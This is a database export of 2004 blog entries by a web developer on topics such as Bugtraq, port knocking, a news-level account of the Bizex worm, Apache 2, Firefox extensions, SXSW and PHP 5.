		<field name="slug">cheapDialUps</field>
		<field name="body">&lt;p&gt;I'm in the market for a cheap US dial-up internet provider. I'm connected via broadband most of the time but I really need to get a backup modem account. In the UK, dialup accounts are available for free with the cost of the phone call as the only charge applied. I haven't heard of any similar deals in the states, so I'm looking for recommendations. I won't be using it very often so the cheaper the better.&lt;/p&gt;</field>
		<field name="created">2004-02-21 01:17:27</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1358</field>
		<field name="title">&quot;I'm Brian and so's my wife&quot;</field>
		<field name="slug">brian</field>
		<field name="body">&lt;p&gt;I'm subscribed to a whole bunch of mailing lists, mostly as a lurker as I have a hard enough time just keeping up with some of them. One of those lists is &lt;a href=&quot;http://www.securityfocus.com/archive/1&quot;&gt;Bugtraq&lt;/a&gt;, which is pretty much required reading for anyone with sysadmin responsibilities for a server connected to the public internet. Bugtraq is the central hub of the &quot;public disclosure&quot; security community and is actually surprisingly low traffic with only twenty or so messages a day. It's fascinating to watch the latest exploits for all manner of popular software packages tick by on an hourly basis.&lt;/p&gt;

&lt;p&gt;Last week, someone &lt;a href=&quot;http://www.securityfocus.com/archive/1/354615/2004-02-14/2004-02-20/0&quot; title=&quot;Bank of America contact&quot;&gt;posted&lt;/a&gt; to the list asking if anyone knew of a contact address for the security team at Bank of America. Today, they posted &lt;a href=&quot;http://www.securityfocus.com/archive/1/354779/2004-02-21/2004-02-27/0&quot; title=&quot;Re: Bank of America Contact&quot;&gt;a follow-up&lt;/a&gt; which included the following gem:&lt;/p&gt;

&lt;blockquote cite=&quot;http://www.securityfocus.com/archive/1/354779/2004-02-21/2004-02-27/0&quot;&gt;
&lt;p&gt;I'd also like to thank the 0-day social engineers for their variety of
approaches used to attempt to gain access to this exploit.  We received
responses ranging from fraudulent &quot;Bank of America&quot; employees to phone
calls from people claiming to be from Bank of America's IT Security.  (One
caller claimed to be from Bank of America's IT Security but didn't know
what PGP is and then said he couldn't give his PGP key due to security
restrictions.  And when we asked him to provide information so we could
verify the contact, he said he would call back but never did.  To this
caller: Yes, your social engineering failed and your caller-id spoofing was
almost perfect.  Emphasis on &quot;almost&quot;.)&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;For some reason, I'm reminded of &lt;a href=&quot;http://www.imdb.com/title/tt0079470/quotes#qt0034335&quot; title=&quot;I&amp;apos;m Brian and so&amp;apos;s my wife!&quot;&gt;a classic scene&lt;/a&gt; from Monty Python's &lt;cite&gt;Life of Brian&lt;/cite&gt;.&lt;/p&gt;</field>
		<field name="created">2004-02-24 01:26:57</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1359</field>
		<field name="title">Grey Tuesday</field>
		<field name="slug">greyTuesday</field>
		<field name="body">&lt;p&gt;I'm supporting &lt;a href=&quot;http://www.greytuesday.org/&quot;&gt;Grey Tuesday&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2004-02-24 18:25:18</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1360</field>
		<field name="title">Novel security measures</field>
		<field name="slug">novel</field>
		<field name="body">&lt;p&gt;An &lt;a href=&quot;http://www.securityfocus.com/columnists/221&quot; title=&quot;Knock, Knock, Knock&quot;&gt;article on SecurityFocus&lt;/a&gt; led me to this site about &lt;a href=&quot;http://www.portknocking.org/&quot;&gt;Port Knocking&lt;/a&gt;. Port Knocking is an interesting security technique in which a box sits online with no ports open to connections and awaits a specific sequence of connection attempts. A user wishing to connect to the box must first attempt to initiate connections to ports in a specific, secret order. Once they do, the box starts up the required service (such as an &lt;acronym title=&quot;Secure SHell&quot;&gt;SSH&lt;/acronym&gt; daemon) on a designated port and allows the user to connect properly.&lt;/p&gt;

&lt;p&gt;It's a pretty neat trick, and one that may well start showing up in backdoors and trojans in the future. It reminds me of a couple of other novel firewall related tricks: &lt;a href=&quot;http://www.openlysecure.org/openbsd/how-to/invisible_firewall.html&quot; title=&quot;Invisible Firewalling How-To&quot;&gt;invisible firewalls&lt;/a&gt; and &lt;a href=&quot;http://www.linuxsecurity.com/articles/firewalls_article-4418.html&quot; title=&quot;Running Your Firewall in runlevel 0&quot;&gt;firewalls that are effectively turned off&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2004-02-25 23:40:06</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1361</field>
		<field name="title">Crap marketing sites</field>
		<field name="slug">crap</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.i-am-asian.com/&quot;&gt;i-am-asian.com&lt;/a&gt; is McDonald's excruciating &quot;I'm lovin' it&quot; site targeted at Asian Pacific Islander Americans. With gems like &lt;q cite=&quot;http://www.i-am-asian.com/&quot;&gt;whether we're sipping green tea or enjoying a Big Mac sandwich, we're helping make the magic mix called America become even richer&lt;/q&gt; you can't go wrong. Meanwhile, the infamous beef industry sponsored &lt;a href=&quot;http://www.cool-2b-real.com/&quot;&gt;cool-2b-real&lt;/a&gt; has rebranded itself as &quot;zip 4 tweens&quot; - &lt;q cite=&quot;http://www.cool-2b-real.com/&quot;&gt;for &quot;tween&quot; kids - not quite teens but definitely not children!&lt;/q&gt; Where's the &lt;a href=&quot;http://www.ragingplatypus.com/&quot;&gt;raging platypus&lt;/a&gt; when you need him?&lt;/p&gt;</field>
		<field name="created">2004-02-27 16:16:48</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1362</field>
		<field name="title">Bizex</field>
		<field name="slug">bizex</field>
		<field name="body">&lt;p&gt;I'm going to try not to turn this in to a blog about Windows security exploits but this one is genuinely interesting in that it actively tries to steal financial information and important passwords. Bizex spreads itself by spamming messages over ICQ advising the recipient to visit a specific &lt;acronym title=&quot;Universal Republic of Love&quot;&gt;URL&lt;/acronym&gt;. When they visit it, Internet Explorer exploits are used to download and execute the main payload which then infects their ICQ program and uses it to message their contacts. The worm also scans their hard drive for information relating to a number of well known financial services which it then uploads to a server via &lt;acronym title=&quot;File Transfer Protocol&quot;&gt;FTP&lt;/acronym&gt;, and it apparently snoops on their browser for any passwords travelling over HTTPS connections as well.&lt;/p&gt;

&lt;p&gt;It seems that the sole purpose of this worm was to steal a bunch of cash quickly, and it looks very likely to succeed. The servers used to spread the worm have since been taken offline but you can be sure the person or people behind the worm were smart enough to cover their tracks.&lt;/p&gt;

&lt;p&gt;More on Bizex can be found &lt;a href=&quot;http://www.kaspersky.com/news.html?id=4277566&quot; title=&quot;&amp;apos;Bizex&amp;apos; worm attacks ICQ users [02/24/2004]&quot;&gt;here&lt;/a&gt; and &lt;a href=&quot;http://www.viruslist.com/eng/viruslist.html?id=1029528&quot; title=&quot;Worm.Win32.Bizex&quot;&gt;here&lt;/a&gt;; Thors Larholm's &lt;a href=&quot;http://www.securityfocus.com/archive/1/355149/2004-02-24/2004-03-01/0&quot; title=&quot;Fw: [Unpatched] The Bizex worm&quot;&gt;analysis on BugTraq&lt;/a&gt; is particularly insightful.&lt;/p&gt;</field>
		<field name="created">2004-02-27 23:30:28</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1363</field>
		<field name="title">In praise of Apache documentation</field>
		<field name="slug">apache2</field>
		<field name="body">&lt;p&gt;I spent much of today upgrading a distinctly hairy Apache 1.3 server to Apache 2.0 as part of a routine &lt;acronym title=&quot;Operating System&quot;&gt;OS&lt;/acronym&gt; upgrade. It certainly wasn't plain sailing - I still have a few crinkles to iron out - but that's more down to the weirdness of the existing configuration than any problems with Apache 2.&lt;/p&gt;

&lt;p&gt;Apache 2 is a beautifully designed piece of software. The &lt;a href=&quot;http://httpd.apache.org/docs-2.0/&quot;&gt;documentation&lt;/a&gt; is superb - the &lt;a href=&quot;http://httpd.apache.org/docs-2.0/upgrading.html&quot; title=&quot;Upgrading to 2.0 from 1.3&quot;&gt;migration guide&lt;/a&gt; proved invaluable but the real gem was the &lt;a href=&quot;http://httpd.apache.org/docs-2.0/mod/quickreference.html&quot;&gt;directive quick reference&lt;/a&gt;. Armed with the quick reference and Firefox's &lt;a href=&quot;http://www.mozilla.org/projects/ui/accessibility/typeaheadfind.html&quot;&gt;Type Ahead Find&lt;/a&gt; the previously inpenetrable &lt;samp&gt;httpd.conf&lt;/samp&gt; file becomes a living tutorial on the wild and wonderful ways of Apache configuration. A wise old sysadmin once told me that the best way of learning Linux is to &lt;samp&gt;ls /bin&lt;/samp&gt; and run &lt;samp&gt;man &amp;lt;command&amp;gt;&lt;/samp&gt; for every command in there - then do the same thing for &lt;samp&gt;/sbin&lt;/samp&gt;, then &lt;samp&gt;/usr/bin&lt;/samp&gt; and so on until you run out of things to read. The same appears to be true of Apache configuration directives.&lt;/p&gt;</field>
		<field name="created">2004-03-02 05:11:41</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1364</field>
		<field name="title">LugRadio</field>
		<field name="slug">lugRadio</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.lugradio.org/&quot;&gt;LugRadio&lt;/a&gt; rocks. It's a collaboration between &lt;a href=&quot;http://www.jonobacon.org/&quot;&gt;Jono Bacon&lt;/a&gt;, &lt;a href=&quot;http://www.kryogenix.org/&quot;&gt;Stuart Langridge&lt;/a&gt;, &lt;a href=&quot;http://www.westmids.biz/blog/&quot;&gt;Stephen Parkes&lt;/a&gt; and &lt;a href=&quot;http://www.webeditorblog.com/&quot;&gt;Matthew Revell&lt;/a&gt;, all members of the &lt;a href=&quot;http://www.wolveslug.org.uk/&quot;&gt;Wolverhampton Linux User Group&lt;/a&gt;. They've just released their second episode after over 1,000 people downloaded the first one. It's witty, laid back, saracastic and quintessentially English - in fact just listening to some genuine British banter is enough to make me a little homesick. Thoroughly recommended.&lt;/p&gt;</field>
		<field name="created">2004-03-04 21:30:16</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1365</field>
		<field name="title">Two handy FireFox extensions</field>
		<field name="slug">handyExtensions</field>
		<field name="body">&lt;p&gt;Just a quick plug for a couple of FireFox extensions I've been digging recently. Chris Pederick's &lt;a href=&quot;http://www.chrispederick.com/work/firefox/webdeveloper/&quot;&gt;Web Developer toolbar&lt;/a&gt; / menu extension combines ideas from a whole bunch of other extensions and bookmarklets in to one extremely useful whole. The usual assortment of validation and element outlining options are present, but the really useful tools are &quot;View Cookie Information&quot; and &quot;View Response Headers&quot;. I've used separate extensions for these before but it's handy to have them all in one package.&lt;/p&gt;

&lt;p&gt;The second is something which really should be built in to every browser: &lt;a href=&quot;http://extensionroom.mozdev.org/more-info/clearhttpauth&quot;&gt;Clear HTTP Auth&lt;/a&gt;, which lets you log out of &lt;acronym title=&quot;HyperText Transfer Protocol&quot;&gt;HTTP&lt;/acronym&gt; authenticated sites without having to close all your browser windows.&lt;/p&gt;</field>
		<field name="created">2004-03-05 06:42:54</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1366</field>
		<field name="title">Attribution</field>
		<field name="slug">attribution</field>
		<field name="body">&lt;p&gt;Via &lt;a href=&quot;http://fury.com/article/1966.php&quot; title=&quot;Memegraphing&quot;&gt;Kevin Fox&lt;/a&gt;, Wired are running &lt;a href=&quot;http://www.wired.com/news/culture/0,1284,62537,00.html&quot;&gt;an article&lt;/a&gt; that claims that &lt;q cite=&quot;http://fury.com/article/1966.php&quot;&gt;authors of popular blog sites regularly borrow topics from lesser-known bloggers -- and they often do so without attribution&lt;/q&gt;.&lt;/p&gt;

&lt;p&gt;The first part - that bloggers borrow topics from each other - isn't a new observation. Link commentary is one of the clasic forms of blogging, right up there with filling in quizzes and posting pictures of your cat. What's worrying is the lack of attribution.&lt;/p&gt;

&lt;p&gt;Attribution is a critical part of good blogging etiquette. It provides &quot;discovery credit&quot; to the blogger who directed you to something, but more importantly it acts as a tool for communication. It's easy to tell when someone is linking to you, via referral logs or services such as &lt;a href=&quot;http://www.technorati.com/&quot;&gt;Technorati&lt;/a&gt;. By attributing something to another blogger you make two useful statements: I read your blog (or at least stumbled across it somehow), and I'm interested in that particular entry. This is valuable feedback.&lt;/p&gt;

&lt;p&gt;My favoured attribution method is the &quot;via&quot; link, as demonstrated at the start of this entry; I even use it in my blogmarks. One problem that I used to have with attributing interesting links, &lt;a href=&quot;http://blog.meriwilliams.com/archives/000084.html&quot; title=&quot;Kids with No Friends and Other Everyday Things&quot;&gt;described here&lt;/a&gt; by Meri, is that when you browse with multiple tabs or browser windows it's easy to lose track of how you got to a certain page thanks to a &quot;broken&quot; back button. Thankfully there's a simple solution to this: the &lt;a href=&quot;javascript:void(prompt(&amp;apos;Referer:&amp;apos;, document.referrer));&quot;&gt;show referrer&lt;/a&gt; bookmarklet (adapted from &lt;a href=&quot;http://www.squarefree.com/bookmarklets/misc.html&quot; title=&quot;go to referrer&quot;&gt;a similar bookmarklet&lt;/a&gt; by Jesse Ruderman) which shows the page that referred you to the current page in an easily copy-and-pastable Javascript prompt.&lt;/p&gt;

&lt;p&gt;This still doesn't help you if you clicked on a link in an aggregator such as NetNewsWire, but I've started habitually opening the real entry in a browser before clicking any links to ensure I maintain referral information. This is particularly important as the bookmarklet I use for updating my blogroll grabs the referrer for automatic &quot;via&quot; link generation.
&lt;/p&gt;</field>
		<field name="created">2004-03-05 23:13:12</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1367</field>
		<field name="title">Ghost town, sponsored by Google</field>
		<field name="slug">ghostTown</field>
		<field name="body">&lt;p&gt;Via &lt;a href=&quot;http://boingboing.net/2004_03_01_archive.html#107852164183349516&quot; title=&quot;Photoblogging Chernobyl &quot;&gt;Boing Boing&lt;/a&gt;, this &lt;a href=&quot;http://www.angelfire.com/extreme4/kiddofspeed/page2.html&quot;&gt;fascinating and utterly chilling&lt;/a&gt; photographic journey through the abandoned ruins of the Chernobyl dead zone.&lt;/p&gt;

&lt;p&gt;As an aside, the free hosting provide used by the site appears to be inserting Google ads. Make sure you look out for them as you explore the site; the relevance algorithm gets stretched to the limit.&lt;/p&gt;</field>
		<field name="created">2004-03-06 00:30:00</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1368</field>
		<field name="title">We've found the weapons of mass destruction</field>
		<field name="slug">wmd</field>
		<field name="body">&lt;p&gt;At work while poking around the official website for &lt;a href=&quot;http://www.cpa-iraq.org/&quot;&gt;Iraq's Coalition Provisional Authority&lt;/a&gt; we stumbled across some interesting meta tags:&lt;/p&gt;

&lt;blockquote cite=&quot;view-source:http://www.cpa-iraq.org/&quot;&gt;&lt;p&gt;&lt;code&gt;&amp;lt;meta name=&quot; keywords&quot; content=&quot;Coalition, Saddam, Hussein, War, Iraq, Oil, army, health, Gulf War, military, humanitarian, operations, Medical, assistance, &lt;strong&gt;mass&lt;/strong&gt;, &lt;strong&gt;destruction&lt;/strong&gt;, Military, medical, news, Bremer, forces, RPGs, national, guard, defense, DoD, security, war, contracts, contracting, civilian, KBR, Bechtel, Halliburton, electricity, baghdad, Iraqi, Iraqis, Sunni, Shiite, kurds, , defense, bombing, missile, &lt;strong&gt;weapon&lt;/strong&gt;, &lt;strong&gt;weapons&lt;/strong&gt;, &lt;strong&gt;WMD&lt;/strong&gt;&quot;&amp;gt;&lt;/code&gt;
&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;The nod towards Halliburton is a nice touch as well.&lt;/p&gt;</field>
		<field name="created">2004-03-08 17:19:04</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1369</field>
		<field name="title">Lockergnome reverts</field>
		<field name="slug">devolution</field>
		<field name="body">&lt;p&gt;I decided to hold off commenting on &lt;a href=&quot;http://channels.lockergnome.com/web/backissues/20040303.phtml#20040303_1&quot; title=&quot;GNOMEREPORT: Busy Bees In The Hive&quot;&gt;the news&lt;/a&gt; that &lt;a href=&quot;http://www.lockergnome.com/&quot;&gt;Lockergnome&lt;/a&gt; were dropping their &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; layout in favour of a table based alternative until I had seen the new design for myself. I figured that they were probably just going to move to a transitional tables/&lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; combination design with tables used to bypass some of the more taxing cross-browser issues. I think the following code snippet from their new front page speaks for itself:&lt;/p&gt;

&lt;pre&gt;
&amp;lt;p&amp;gt;&amp;amp;nbsp;&amp;lt;/p&amp;gt;
&amp;lt;p&amp;gt;&amp;amp;nbsp;&amp;lt;/p&amp;gt;
&amp;lt;table border=&quot;0&quot; cellspacing=&quot;0&quot; cellpadding=&quot;0&quot; width=&quot;778&quot; 
bgcolor=&quot;#FFFFFF&quot;&amp;gt;
&amp;lt;tr&amp;gt;&amp;lt;td align=&quot;left&quot;&amp;gt;
&amp;lt;div id=&quot;footer&quot;&amp;gt;
  &amp;lt;blockquote&amp;gt;&amp;amp;copy; 1996-2004, Lockergnome LLC. ISSN: 1095-3965. All 
  Rights Reserved. Please read our &amp;lt;a href=&quot;/about/privacy-policy.phtml&quot;&amp;gt;
  Privacy Policy&amp;lt;/a&amp;gt; and &amp;lt;a href=&quot;/about/terms-of-service.phtml&quot;&amp;gt;
  Terms of Service&amp;lt;/a&amp;gt;. Web site hosted by 
  &amp;lt;a href=&quot;http://www.webair.com/cgi-bin/in?51&quot;&amp;gt;Webair&amp;lt;/a&amp;gt;. 
  Email newsletters powered by &amp;lt;a href=&quot;http://www.whatcounts.com/&quot;&amp;gt;WhatCounts&amp;lt;/a&amp;gt;. 
  Domain registered at &amp;lt;a href=&quot;https://www.gnomedomains.com/&quot;&amp;gt;GnomeDOMAINS&amp;lt;/a&amp;gt;.
&amp;lt;/blockquote&amp;gt;
&amp;lt;/div&amp;gt;
&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;/table&amp;gt;
&lt;/pre&gt;

&lt;p&gt;A blockquote for indentation, &lt;em&gt;inside&lt;/em&gt; a table that exists purely to apply a width, following on from two empty paragraphs for added vertical space? It's like &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; margin properties never happened. Welcome back to 1996.&lt;/p&gt;</field>
		<field name="created">2004-03-08 20:37:08</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1370</field>
		<field name="title">SXSW on a shoe-string</field>
		<field name="slug">sxsw</field>
		<field name="body">&lt;p&gt;So, in customary last-minute style I've decided to go to &lt;a href=&quot;http://www.sxsw.com/interactive/&quot;&gt;SXSW Interactive&lt;/a&gt; this year. I can get a student ticket on the door so all I need to sort out is transport and accomodation. The cheapest air fare I can find at this point is $700+ (&lt;a href=&quot;http://www.expedia.com/&quot;&gt;Expedia&lt;/a&gt; quoted me $415, then at the last minute laughed in my face and told me I couldn't book the ticket). The &lt;a href=&quot;http://www.greyhound.com/&quot;&gt;Greyhound&lt;/a&gt; is $220 and although it's a 20 hour journey each way the timetable is actually pretty decent, getting me to the conference for Friday evening and back by early Wednesday morning. It looks like I'm going to experience America close-up!&lt;/p&gt;

&lt;p&gt;As for accomodation... anyone going and want to share a hotel room?&lt;/p&gt;</field>
		<field name="created">2004-03-09 07:10:51</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1371</field>
		<field name="title">Shocking</field>
		<field name="slug">whenWillTheyLearn</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.www2004.org/&quot; title=&quot;NYC 2004 WWW Conference&quot;&gt;Yuck&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote cite=&quot;view-source:http://www.www2004.org/&quot;&gt;&lt;p&gt;&lt;code&gt;&amp;lt;img src=&quot;images/blank.gif&quot; alt=&quot;blank space (graphical place holder)&quot;width=&quot;55&quot; height=&quot;5&quot;&amp;gt;&lt;/code&gt;&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;Via &lt;a href=&quot;http://www.webstandards.org/buzz/archive/2004_03.html#a000310&quot; title=&quot;Code As I Say, Not As I Do&quot;&gt;WaSP&lt;/a&gt;. When the 13th International World Wide Web Conference gets it this badly wrong it's obvious that something about our industry is fundamentally broken.&lt;/p&gt;

&lt;p&gt;And with that note, I'm off to &lt;acronym title=&quot;South by South West&quot;&gt;SXSW&lt;/acronym&gt;.&lt;/p&gt;</field>
		<field name="created">2004-03-12 03:07:40</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1372</field>
		<field name="title">SXSW 2004</field>
		<field name="slug">sxswInBrief</field>
		<field name="body">&lt;p&gt;SXSW 2004 was a blast: by far the geekiest weekend of my life. I was planning on writing a few updates from the conference but quickly discovered that laptops and socialising just don't mix - there were just too many interesting people to talk to!&lt;/p&gt;

&lt;p&gt;A special thanks has to go to &lt;a href=&quot;http://dunck.us/&quot;&gt;Jeremy Dunck&lt;/a&gt;, who sorted me out with accomodation on his brother's couch and gave me a lift up from Dallas to Austin. If he blogs half as smart as he talks his soon-to-be-launched weblog will be an absolute treat.&lt;/p&gt;

&lt;p&gt;I attended a whole bunch of panels, and tried to sample a good range of topics. Surprisingly one of the most thought-provoking was &lt;a href=&quot;http://www.sxsw.com/interactive/panels/index.php?action=detail&amp;amp;con=ia&amp;amp;id=19&quot;&gt;Monetizing the Blogosphere&lt;/a&gt;, which I went along to purely to see if any fights would break out. It turned out to be a marketing pitch for &lt;a href=&quot;http://www.weblogsinc.com/&quot;&gt;Weblogs Inc&lt;/a&gt;, but their business plan and author package was impressive. Authors get the first $1,000 earned by their blog every month with the rest of the revenue split 50/50. The value proposition is that Weblogs Inc will actively seek advertisers and sponsorship deals - the kind of miserable task that most bloggers would run a mile from. Jason Calacanis added an element of fun to the proceedings by introducing a purple furry monkey as a &quot;proxy&quot; for rival blog promoter Nick Denton, who was unable (or unwilling) to attend the panel.&lt;/p&gt;

&lt;p&gt;I hope to write some more about SxSW in the next few days but I've come back to a literal mountain of work (it's NCAA tournament week) so I'll be pretty busy for a while.&lt;/p&gt;</field>
		<field name="created">2004-03-18 22:20:32</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1373</field>
		<field name="title">PHP 5 Release Candidate 1</field>
		<field name="slug">PHP5RC1</field>
		<field name="body">&lt;p&gt;I haven't blogged much about &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; in a while because I've been up to my nose in mod_python and loving every minute of it. This news is just too important to miss: &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; 5 Release Candidate 1 &lt;a href=&quot;http://www.php.net/downloads.php#v5&quot; title=&quot;PHP 5 Release Candidate 1&quot;&gt;has been released&lt;/a&gt;, bringing the first production-ready release tantilisingly close. While I doubt &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; 5 will tempt me back it's definitely an exciting upgrade - my biggest complaint with &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; 4 is the brain-dead object model which defaults to copying whole objects rather than passing references, and this is one of the many things  addressed by &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; 5. The new libxml2 powered &lt;acronym title=&quot;eXtensible Markup Language&quot;&gt;XML&lt;/acronym&gt; features sound really powerful, and SQLite as an on-board database should be ideal for knocking out small stand-alone applications without needing to set up a mySQL database for them.&lt;/p&gt;

&lt;p&gt;I may well throw a copy on my Mac over the weekend and try out the changes since version 4.3.&lt;/p&gt;</field>
		<field name="created">2004-03-19 01:27:51</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1374</field>
		<field name="title">Internet culture</field>
		<field name="slug">culture</field>
		<field name="body">&lt;p&gt;In what could be the most significant internet cultural event of the decade, Strong Bad has &lt;a href=&quot;http://www.homestarrunner.com/sbemailahundred.html&quot;&gt;answered his 100th email&lt;/a&gt;. Attempts to guess the &lt;acronym title=&quot;Universal Republic of Love&quot;&gt;URL&lt;/acronym&gt; ahead of time &lt;a href=&quot;http://www.homestarrunner.com/sbemail100.html&quot;&gt;were futile&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://alex.netwindows.org/&quot;&gt;Alex Russell&lt;/a&gt; was sporting a &lt;a href=&quot;http://store.yahoo.com/homestarrunner/cheat.html&quot;&gt;The Cheat T-Shirt&lt;/a&gt; at SxSW. He said that they're the single best present to buy for anyone who likes Home Star Runner. I'm inclined to agree.&lt;/p&gt;</field>
		<field name="created">2004-03-20 01:00:38</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1375</field>
		<field name="title">Avoiding protracted debates</field>
		<field name="slug">avoiding</field>
		<field name="body">&lt;p&gt;I love &lt;a href=&quot;http://fishbowl.pastiche.org/&quot;&gt;Charles Miller's Fishbowl&lt;/a&gt;. His latest entry introduces his &lt;a href=&quot;http://fishbowl.pastiche.org/2004/03/21/charles_rules_of_argument&quot;&gt;rules for argument&lt;/a&gt;. Read them, follow them and save a truck-load of time avoiding protracted debates in the future. Heck, if everyone stuck to them the overall productivity of the internet would probably increase by a factor of ten.&lt;/p&gt;</field>
		<field name="created">2004-03-21 04:48:25</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1376</field>
		<field name="title">Democratised Namespaces</field>
		<field name="slug">democratised</field>
		<field name="body">&lt;p&gt;The New York Times: &lt;a href=&quot;http://www.nytimes.com/2004/03/21/magazine/21NAMES.html?ex=1080450000&amp;amp;ei=5062&amp;amp;partner=GOOGLE&quot;&gt;Get out of my Namespace&lt;/a&gt; (via &lt;a href=&quot;http://www.dynamicobjects.com/d2r/archives/002645.html&quot; title=&quot;names, or lack thereof&quot;&gt;Diego Doval&lt;/a&gt;) - a well-researched look at the huge problems (and frivolous lawsuits) being generated by the global quest for ownership of unique names.&lt;/p&gt;

&lt;p&gt;Unsurprisingly, the fundamentally broken domain name system is a recurrent theme. I hadn't heard about bodacious-tatas.com vs the Tata Group of India but it seems pretty indicative of the whole crazy situation. Fans of &lt;a href=&quot;http://www.typekey.com/&quot;&gt;TypeKey&lt;/a&gt; take note: this is what you get when you build a centralised system in a decentralised world.&lt;/p&gt;

&lt;p&gt;An interesting side effect of all of this is the role of Google's PageRank algorithm in creating a democratised namespace. &lt;a href=&quot;http://www.mozilla.org/products/firefox/&quot;&gt;FireFox&lt;/a&gt; and &lt;a href=&quot;http://www.apple.com/safari/&quot;&gt;Safari&lt;/a&gt;, the two browsers I use on a daily basis, both include a &quot;search Google&quot; box to the right of the standard &lt;acronym title=&quot;Universal Republic of Love&quot;&gt;URL&lt;/acronym&gt; bar. If I'm going to a site about a certain topic or person for the first time I will almost always enter the relevant terms in that box rather than trying to guess a domain. PageRank usually ensures that the first returned result is the definitive resource on the entered term - a democratic process, achieved by general consensus of the billions of pages that make up the web.&lt;/p&gt;

&lt;p&gt;Of course, this also strengthens the whole &lt;acronym title=&quot;Universal Republic of Love&quot;&gt;URL&lt;/acronym&gt;s as identity idea, where you need a well ranked web presence (generally a weblog) to confirm your place in internet society. Owning your name on Google becomes more important than owning your name with &lt;acronym title=&quot;Internet Corporation for Assigned Names and Numbers&quot;&gt;ICANN&lt;/acronym&gt;.&lt;/p&gt;</field>
		<field name="created">2004-03-21 19:22:20</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1377</field>
		<field name="title">Zend PHP 5 Goodies</field>
		<field name="slug">zendGoodies</field>
		<field name="body">&lt;p&gt;Zend have quietly released a veritable treasure trove of &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; 5 tutorials via their &lt;a href=&quot;http://www.zend.com/php5/&quot;&gt;PHP5 InfoCenter&lt;/a&gt;:&lt;/p&gt;

&lt;ul&gt;
 &lt;li&gt;&lt;a href=&quot;http://www.zend.com/php5/articles/php5-xmlphp.php&quot;&gt;XML in PHP 5 - What's New?&lt;/a&gt; by Christian Stocker&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://www.zend.com/php5/articles/php5-SOAP.php&quot;&gt;PHP SOAP Extension&lt;/a&gt; by Dmitry Stogov&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://www.zend.com/php5/articles/php5-sqlite.php&quot;&gt;SQLite Introduction&lt;/a&gt; by Ilia Alshanetsky&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://www.zend.com/php5/articles/php5-tidy.php&quot;&gt;Tidying up your HTML with PHP 5&lt;/a&gt; by John Coggeshall&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://www.zend.com/php5/articles/php5-dotnet.php&quot;&gt;Com_dotnet&lt;/a&gt; by Wez Furlong&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://www.zend.com/php5/articles/php5-mysqli.php&quot;&gt;Using ext/mysqli: Part I - Overview and Prepared Statements&lt;/a&gt; by Zak Greant and Georg Richter&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The &lt;a href=&quot;http://www.php.net/tidy&quot;&gt;Tidy functions&lt;/a&gt; look particularly useful, especially if you are interested in maintaining clean markup within your &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; applications.&lt;/p&gt;

